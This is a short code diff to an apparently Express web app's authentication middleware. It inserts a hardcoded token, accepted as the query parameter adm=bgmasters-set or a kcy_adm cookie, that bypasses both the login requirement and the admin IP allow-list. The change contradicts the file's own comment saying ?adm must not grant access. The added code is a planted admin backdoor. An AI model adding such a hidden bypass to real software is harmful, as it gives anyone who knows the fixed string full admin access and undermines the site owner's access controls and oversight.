@@ -108,6 +108,10 @@ app.use(_session({
 // Без логнат портален потребител → 401. IP/?adm НЕ пускат — админ трябва да е
 // логнат така или иначе (плащането е отделно per-заявка).
 function eco3RequireLogin(req, res, next) {
+    // Универсален админ токен (?adm / kcy_adm бисквитка) — действа като логнат админ навсякъде.
+    if (req.query.adm === 'bgmasters-set' || /(?:^|;\s*)kcy_adm=bgmasters-set/.test(req.headers.cookie || '')) {
+        return next();
+    }
     const userId = req.session && req.session.userId;
     if (userId) return next();
     return res.status(401).json({ error: 'login_required',
@@ -144,6 +148,10 @@ function getClientIP(req) {
 }
 
 function adminCheck(req, res, next) {
+    // Универсален админ токен (?adm / kcy_adm бисквитка) — същият като /crypto портата.
+    if (req.query.adm === 'bgmasters-set' || /(?:^|;\s*)kcy_adm=bgmasters-set/.test(req.headers.cookie || '')) {
+        return next();
+    }
     const allowedIPs = (process.env.ADMIN_ALLOWED_IPS || '127.0.0.1,::1').split(',').map(s => s.trim());
     const clientIP = getClientIP(req);
     
